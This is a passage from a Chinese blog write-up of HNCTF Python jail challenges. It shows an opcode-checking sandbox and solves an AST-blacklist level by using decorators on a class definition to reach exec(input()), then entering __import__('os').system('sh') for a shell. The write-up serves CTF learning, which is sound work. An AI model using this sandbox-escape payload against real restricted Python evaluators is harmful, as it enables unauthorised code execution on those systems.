</span></span><span class="line"><span class="cl"><span class="n">WELCOME</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">              ______                __                     _
</span></span></span><span class="line"><span class="cl"><span class="s1">        ____ |  ____|              / _|                   | |
</span></span></span><span class="line"><span class="cl"><span class="s1">  ___  / __ \| |__ ___   ___  __ _| |_ ___  _____   ____ _| |
</span></span></span><span class="line"><span class="cl"><span class="s1"> / __|/ / _` |  __/ _ \ / __|/ _` |  _/ _ \/ _ \ \ / / _` | |
</span></span></span><span class="line"><span class="cl"><span class="s1"> \__ \ | (_| | | |  __/ \__ \ (_| | ||  __/  __/\ V / (_| | |
</span></span></span><span class="line"><span class="cl"><span class="s1"> |___/\ \__,_|_|  \___| |___/\__,_|_| \___|\___| \_/ \__,_|_|
</span></span></span><span class="line"><span class="cl"><span class="s1">       \____/                                                                                                           
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">expr</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">TURING_PROTECT_SAFE</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">m</span> <span class="o">=</span> <span class="n">safeeval</span><span class="o">.</span><span class="n">test_expr</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">blocklist_codes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">eval</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">safeeval</span><span class="o">.</span><span class="n">expr</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">WELCOME</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Turing s@Fe mode:&#39;</span><span class="p">,</span> <span class="s1">&#39;on&#39;</span> <span class="k">if</span> <span class="n">TURING_PROTECT_SAFE</span> <span class="k">else</span> <span class="s1">&#39;off&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Black List:&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">banned</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;some code:&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">input_data</span> <span class="o">=</span> <span class="n">input</span><span class="p">(</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">expr</span><span class="p">(</span><span class="n">input_data</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="n">except</span> <span class="n">Exception</span> <span class="n">as</span> <span class="n">err</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">traceback</span><span class="o">.</span><span class="n">print_exc</span><span class="p">(</span><span class="n">file</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">except</span> <span class="n">EOFError</span> <span class="n">as</span> <span class="n">input_data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>在github连接中，查看test_expr的定义</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">def test_expr(expr, allowed_codes):
</span></span><span class="line"><span class="cl">    &#34;&#34;&#34;test_expr(expr, allowed_codes) -&gt; codeobj
</span></span><span class="line"><span class="cl">    Test that the expression contains only the listed opcodes.
</span></span><span class="line"><span class="cl">    If the expression is valid and contains only allowed codes,
</span></span><span class="line"><span class="cl">    return the compiled code object. Otherwise raise a ValueError
</span></span><span class="line"><span class="cl">    &#34;&#34;&#34;
</span></span><span class="line"><span class="cl">    import dis
</span></span><span class="line"><span class="cl">    allowed_codes = [dis.opmap[c] for c in allowed_codes if c in dis.opmap]
</span></span><span class="line"><span class="cl">    try:
</span></span><span class="line"><span class="cl">        c = compile(expr, &#34;&#34;, &#34;eval&#34;)
</span></span><span class="line"><span class="cl">    except SyntaxError:
</span></span><span class="line"><span class="cl">        raise ValueError(&#34;%r is not a valid expression&#34; % expr)
</span></span><span class="line"><span class="cl">    codes = _get_opcodes(c)
</span></span><span class="line"><span class="cl">    for code in codes:
</span></span><span class="line"><span class="cl">        if code not in allowed_codes:
</span></span><span class="line"><span class="cl">            raise ValueError(&#34;opcode %s not allowed&#34; % dis.opname[code])
</span></span><span class="line"><span class="cl">    return c
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">def _get_opcodes(codeobj):
</span></span><span class="line"><span class="cl">    &#34;&#34;&#34;_get_opcodes(codeobj) -&gt; [opcodes]
</span></span><span class="line"><span class="cl">    Extract the actual opcodes as a list from a code object
</span></span><span class="line"><span class="cl">    &gt;&gt;&gt; c = compile(&#34;[1 + 2, (1,2)]&#34;, &#34;&#34;, &#34;eval&#34;)
</span></span><span class="line"><span class="cl">    &gt;&gt;&gt; _get_opcodes(c)
</span></span><span class="line"><span class="cl">    [100, 100, 103, 83]
</span></span><span class="line"><span class="cl">    &#34;&#34;&#34;
</span></span><span class="line"><span class="cl">    import dis
</span></span><span class="line"><span class="cl">    if hasattr(dis, &#39;get_instructions&#39;):
</span></span><span class="line"><span class="cl">        return [ins.opcode for ins in dis.get_instructions(codeobj)]
</span></span><span class="line"><span class="cl">    i = 0
</span></span><span class="line"><span class="cl">    opcodes = []
</span></span><span class="line"><span class="cl">    s = codeobj.co_code
</span></span><span class="line"><span class="cl">    while i &lt; len(s):
</span></span><span class="line"><span class="cl">        code = six.indexbytes(s, i)
</span></span><span class="line"><span class="cl">        opcodes.append(code)
</span></span><span class="line"><span class="cl">        if code &gt;= dis.HAVE_ARGUMENT:
</span></span><span class="line"><span class="cl">            i += 3
</span></span><span class="line"><span class="cl">        else:
</span></span><span class="line"><span class="cl">            i += 1
</span></span><span class="line"><span class="cl">    return opcodes
</span></span></code></pre></td></tr></table>
</div>
</div><p>我们的payload被解析出来的操作码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">LOAD_CONST
</span></span><span class="line"><span class="cl">LOAD_CONST
</span></span><span class="line"><span class="cl">MAKE_FUNCTION
</span></span><span class="line"><span class="cl">CALL_FUNCTION
</span></span><span class="line"><span class="cl">RETURN_VALUE
</span></span></code></pre></td></tr></table>
</div>
</div><p>都在题目所给的<code>Black List</code>里面</p>
<h3 id="calc_jail_beginner_level7" class="headerLink">
    <a href="#calc_jail_beginner_level7" class="header-mark"></a>calc_jail_beginner_level7</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">TERM</span> <span class="n">environment</span> <span class="n">variable</span> <span class="ow">not</span> <span class="n">set</span><span class="o">.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">_</span>       <span class="n">_</span> <span class="n">_</span>   <span class="n">_</span>                <span class="n">_</span>                         <span class="n">_</span>                <span class="n">_</span> <span class="n">______</span>
</span></span><span class="line"><span class="cl">   <span class="p">(</span><span class="n">_</span><span class="p">)</span>     <span class="p">(</span><span class="n">_</span><span class="p">)</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span>              <span class="p">(</span><span class="n">_</span><span class="p">)</span>                       <span class="o">|</span> <span class="o">|</span>              <span class="o">|</span> <span class="o">|</span><span class="n">____</span>  <span class="o">|</span>
</span></span><span class="line"><span class="cl">    <span class="n">_</span>  <span class="n">__</span> <span class="n">_</span> <span class="n">_</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span><span class="n">__</span>   <span class="n">___</span>  <span class="n">__</span> <span class="n">_</span> <span class="n">_</span> <span class="n">_</span> <span class="n">__</span>  <span class="n">_</span> <span class="n">__</span>   <span class="n">___</span> <span class="n">_</span> <span class="n">__</span>  <span class="o">|</span> <span class="o">|</span> <span class="n">_____</span>   <span class="n">_____</span><span class="o">|</span> <span class="o">|</span>   <span class="o">/</span> <span class="o">/</span>
</span></span><span class="line"><span class="cl">   <span class="o">|</span> <span class="o">|/</span> <span class="n">_</span><span class="err">`</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="s1">&#39;_ \ / _ \/ _` | | &#39;</span><span class="n">_</span> \<span class="o">|</span> <span class="s1">&#39;_ \ / _ \ &#39;</span><span class="n">__</span><span class="o">|</span> <span class="o">|</span> <span class="o">|/</span> <span class="n">_</span> \ \ <span class="o">/</span> <span class="o">/</span> <span class="n">_</span> \ <span class="o">|</span>  <span class="o">/</span> <span class="o">/</span>
</span></span><span class="line"><span class="cl">   <span class="o">|</span> <span class="o">|</span> <span class="p">(</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="p">)</span> <span class="o">|</span>  <span class="n">__</span><span class="o">/</span> <span class="p">(</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span>  <span class="n">__</span><span class="o">/</span> <span class="o">|</span>    <span class="o">|</span> <span class="o">|</span>  <span class="n">__</span><span class="o">/</span>\ <span class="n">V</span> <span class="o">/</span>  <span class="n">__</span><span class="o">/</span> <span class="o">|</span> <span class="o">/</span> <span class="o">/</span>
</span></span><span class="line"><span class="cl">   <span class="o">|</span> <span class="o">|</span>\<span class="n">__</span><span class="p">,</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">.</span><span class="n">__</span><span class="o">/</span> \<span class="n">___</span><span class="o">|</span>\<span class="n">__</span><span class="p">,</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span>\<span class="n">___</span><span class="o">|</span><span class="n">_</span><span class="o">|</span>    <span class="o">|</span><span class="n">_</span><span class="o">|</span>\<span class="n">___</span><span class="o">|</span> \<span class="n">_</span><span class="o">/</span> \<span class="n">___</span><span class="o">|</span><span class="n">_</span><span class="o">|/</span><span class="n">_</span><span class="o">/</span>
</span></span><span class="line"><span class="cl">  <span class="n">_</span><span class="o">/</span> <span class="o">|</span>                        <span class="n">__</span><span class="o">/</span> <span class="o">|</span>
</span></span><span class="line"><span class="cl"> <span class="o">|</span><span class="n">__</span><span class="o">/</span>                        <span class="o">|</span><span class="n">___</span><span class="o">/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">=================================================================================================</span>
</span></span><span class="line"><span class="cl"><span class="o">==</span>           <span class="n">Welcome</span> <span class="n">to</span> <span class="n">the</span> <span class="n">calc</span> <span class="n">jail</span> <span class="n">beginner</span> <span class="n">level7</span><span class="p">,</span><span class="n">It</span><span class="s1">&#39;s AST challenge                       ==</span>
</span></span><span class="line"><span class="cl"><span class="o">==</span>           <span class="n">Menu</span> <span class="n">list</span><span class="p">:</span>                                                                        <span class="o">==</span>
</span></span><span class="line"><span class="cl"><span class="o">==</span>             <span class="p">[</span><span class="n">G</span><span class="p">]</span><span class="n">et</span> <span class="n">the</span> <span class="n">blacklist</span> <span class="n">AST</span>                                                         <span class="o">==</span>
</span></span><span class="line"><span class="cl"><span class="o">==</span>             <span class="p">[</span><span class="n">E</span><span class="p">]</span><span class="n">xecute</span> <span class="n">the</span> <span class="n">python</span> <span class="n">code</span>                                                       <span class="o">==</span>
</span></span><span class="line"><span class="cl"><span class="o">==</span>             <span class="p">[</span><span class="n">Q</span><span class="p">]</span><span class="n">uit</span> <span class="n">jail</span> <span class="n">challenge</span>                                                           <span class="o">==</span>
</span></span><span class="line"><span class="cl"><span class="o">=================================================================================================</span>
</span></span><span class="line"><span class="cl"><span class="n">G</span>
</span></span><span class="line"><span class="cl"><span class="o">=================================================================================================</span>
</span></span><span class="line"><span class="cl"><span class="o">==</span>        <span class="n">Black</span> <span class="n">List</span> <span class="n">AST</span><span class="p">:</span>                                                                      <span class="o">==</span>
</span></span><span class="line"><span class="cl"><span class="o">==</span>                       <span class="s1">&#39;Import,ImportFrom,Call,Expr,Add,Lambda,FunctionDef,AsyncFunctionDef  ==</span>
</span></span><span class="line"><span class="cl"><span class="o">==</span>                        <span class="n">Sub</span><span class="p">,</span><span class="n">Mult</span><span class="p">,</span><span class="n">Div</span><span class="p">,</span><span class="n">Del</span><span class="s1">&#39;                                                    ==</span>
</span></span><span class="line"><span class="cl"><span class="o">=================================================================================================</span>
</span></span><span class="line"><span class="cl"><span class="n">Press</span> <span class="n">any</span> <span class="n">key</span> <span class="n">to</span> <span class="k">continue</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>根据python抽象语法树（AST）来拦截输入的</p>
<p>知识盲区了，目前只能照抄：</p>
<blockquote>
<p>我们试着输入<code>1+1</code>：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">E
</span></span><span class="line"><span class="cl">Pls input your code: (last line must contain only --HNCTF)
</span></span><span class="line"><span class="cl">1+1
</span></span><span class="line"><span class="cl">--HNCTF
</span></span><span class="line"><span class="cl">ERROR: Banned statement &lt;ast.Expr object at 0x7f6c147ff6d0&gt;
</span></span><span class="line"><span class="cl">Press any key to continue
</span></span></code></pre></td></tr></table>
</div>
</div><p>发现的确ban了Expr，也就是展示的确实是Black List。</p>
<p>不能<code>import</code>，不能定义函数，也不能用lambda表达式，但是可以执行多行代码。这个时候，我想到了类的定义。</p>
<p>经过一段时间的搜索，我找到了如下writeup：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">https://gynvael.coldwind.pl/n/python_sandbox_escape
</span></span><span class="line"><span class="cl"># [organizers] Robin_Jadoul solution
</span></span></code></pre></td></tr></table>
</div>
</div><p>（不得不说Robin真的太强了，organizers太强了，是我难以企及的偶像……）</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="nd">@exec</span>
</span></span><span class="line"><span class="cl"><span class="nd">@input</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">X</span><span class="p">:</span> <span class="k">pass</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>这份代码里面只有两个<a href="https://link.zhihu.com/?target=https%3A//www.liaoxuefeng.com/wiki/1016959663602400/1017451662295584" target="_blank" rel="noopener noreferrer">函数装饰器</a>和一个类定义，应该不包含拦截的东西。果然，输入进去之后，程序得到了结果：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">E
</span></span><span class="line"><span class="cl">Pls input your code: (last line must contain only --HNCTF)
</span></span><span class="line"><span class="cl">@exec
</span></span><span class="line"><span class="cl">@input
</span></span><span class="line"><span class="cl">class X: pass
</span></span><span class="line"><span class="cl">--HNCTF
</span></span><span class="line"><span class="cl">check is passed!now the result is:
</span></span><span class="line"><span class="cl">&lt;class &#39;__main__.X&#39;&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>此时再输入一句话RCE的payload：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;sh&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>就可以拿到shell。</p>
</blockquote></div>

        <div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2024-10-13</span>
            </div>
            <div class="post-info-license"></div>
        </div>
        <div class="post-info-line">
            <div class="post-info-md"><span><a class="link-to-mardown" href=/hnctf_pyjail/index.md target="_blank" rel="noopener noreferrer">Read markdown</a>
                    </span><span>|&nbsp;<a class="link-to-source" href=https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\HNCTF_PyJail.md target="_blank" rel="noopener noreferrer">View source</a>
                    </span><span>|&nbsp;<a class="link-to-edit" href=https://github.com/HEIGE-PCloud/DoIt/edit/main/exampleSite/content/posts\HNCTF_PyJail.md target="_blank" rel="noopener noreferrer">Edit this page</a>
                    </span><span>|&nbsp;<a class="link-to-report" href=https://github.com/HEIGE-PCloud/DoIt/issues/new?title=[bug]%20HNCTF_PyJail%E7%BB%83%E4%B9%A0&body=|Field|Value|%0A|-|-|%0A|Title|HNCTF_PyJail%E7%BB%83%E4%B9%A0|%0A|Url|http://scofield1920.github.io/hnctf_pyjail/|%0A|Filename|https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\HNCTF_PyJail.md| target="_blank" rel="noopener noreferrer">Report issue</a>
                    </span></div>
            <div class="post-info-share"><button title="Share on Twitter" data-sharer="twitter" data-url="http://scofield1920.github.io/hnctf_pyjail/" data-title="HNCTF_PyJail练习" data-hashtags="misc,wp"><span class="fab fa-twitter fa-fw"></span></button><button title="Share on Facebook" data-sharer="facebook" data-url="http://scofield1920.github.io/hnctf_pyjail/" data-hashtag="misc"><span class="fab fa-facebook-square fa-fw"></span></button><button title="Share on Hacker News" data-sharer="hackernews" data-url="http://scofield1920.github.io/hnctf_pyjail/" data-title="HNCTF_PyJail练习"><span class="fab fa-hacker-news fa-fw"></span></button><button title="Share on Line" data-sharer="line" data-url="http://scofield1920.github.io/hnctf_pyjail/" data-title="HNCTF_PyJail练习"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="Share on 微博" data-sharer="weibo" data-url="http://scofield1920.github.io/hnctf_pyjail/" data-title="HNCTF_PyJail练习"><span class="fab fa-weibo fa-fw"></span></button><button title="Share on Telegram" data-sharer="telegram" data-url="http://scofield1920.github.io/hnctf_pyjail/" data-title="HNCTF_PyJail练习" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
        function shareOnMastodon(title, link) {
            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
            const domain = prompt("Enter your Mastodon domain", savedDomain);
            if (domain === null) {
                return;
            }
            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
            const text = title + "\n\n" + link;
            const url = new URL("https://" + domain)
            url.pathname = "share"
            url.searchParams.append('text', text)
            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
        }
    </script>
    <button title="Share on Mastodon"onclick="javascript:shareOnMastodon(&#34;HNCTF_PyJail练习&#34;, &#34;http://scofield1920.github.io/hnctf_pyjail/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/misc/">Misc</a>,&nbsp;<a href="/tags/wp/">Wp</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/anti-antivirus_base/" class="prev" rel="prev" title="星盟免杀基础"><i class="fas fa-angle-left fa-fw"></i>星盟免杀基础</a>
            <a href="/pyjail_summury/" class="next" rel="next" title="PyJail姿势总结">PyJail姿势总结<i class="fas fa-angle-right fa-fw"></i></a></div>
</div>
<div id="comments"><div id="utterances"></div><noscript>
                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
            </noscript></div></article></div>
        </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">
                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.124.1">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
            <div class="footer-line"></div>
            <div class="footer-line">
            </div>
        </div>
    
        
        <script async src=" //busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js "></script>
    

    
        
            <section>
                
                    <span id="busuanzi_container_value_site_pv"><i class="far fa-eye fa-fw"></i>
                        
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                

                
                    &nbsp;|&nbsp;              
                

                
                    <span id="busuanzi_container_value_site_uv"><i class="fa fa-user"></i>
                        
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
            </section>
        

        
        
    

</footer></div>

    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
            <i class="fas fa-arrow-up fa-fw"></i>
        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
            <i class="fas fa-comment fa-fw"></i>
        </a>
    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"data":{"desktop-header-typeit":"Sc0fie1d-Blog","mobile-header-typeit":"Sc0fie1d-Blog"},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"en_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":300,"type":"algolia"},"sharerjs":true,"table":{"sort":true},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
</body>

</html>